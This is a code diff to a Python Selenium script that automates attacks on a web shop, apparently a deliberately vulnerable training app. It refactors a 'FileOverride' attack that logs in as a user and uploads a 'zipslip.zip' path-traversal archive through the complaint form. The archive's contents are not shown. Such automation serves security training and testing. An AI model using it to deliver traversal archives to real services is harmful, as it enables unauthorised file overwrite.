@@ -1,6 +1,5 @@
 import time
 import requests
-import os
 import random
 
 from selenium import webdriver
@@ -25,7 +24,6 @@ class Attack(ABC):
         self.chrome_options = Options()
         self.chrome_options.add_argument("--no-sandbox")
         self.chrome_options.add_argument("--window-size=1480,996")
-        self.dirname = os.path.dirname(__file__)
         super().__init__()
 
     @abstractmethod
@@ -309,7 +307,6 @@ class FileOverride(Attack):
 
     def __init__(self):
         super().__init__()
-        self.malicious_zip = os.path.join(self.dirname + '/zipslip.zip')
 
     def run(self):
         random_user = User(
@@ -319,21 +316,7 @@ class FileOverride(Attack):
                 user_number=7,
                 visible=False)
         random_user.login()
-        # access complain form for zip upload
-        random_user.driver.get(self.base_url + "/#/complain")
-        complaint_textarea = random_user.driver.find_element_by_xpath(
-                '//*[@id="complaintMessage"]')
-        complaint_textarea.send_keys("something")
-        time.sleep(2)
-        input_file_path = random_user.driver.find_element_by_xpath(
-                '//*[@id="file"]')
-        input_file_path.send_keys(self.malicious_zip)
-        time.sleep(2)
-        # click submit button
-        random_user.driver.find_element_by_xpath(
-                '//*[@id="submitButton"]').click()
-        time.sleep(2)
-        random_user.driver.quit()
+        random_user.complain(file_path = '/Files/zipslip.zip')
 
 
 class TwoFactor:
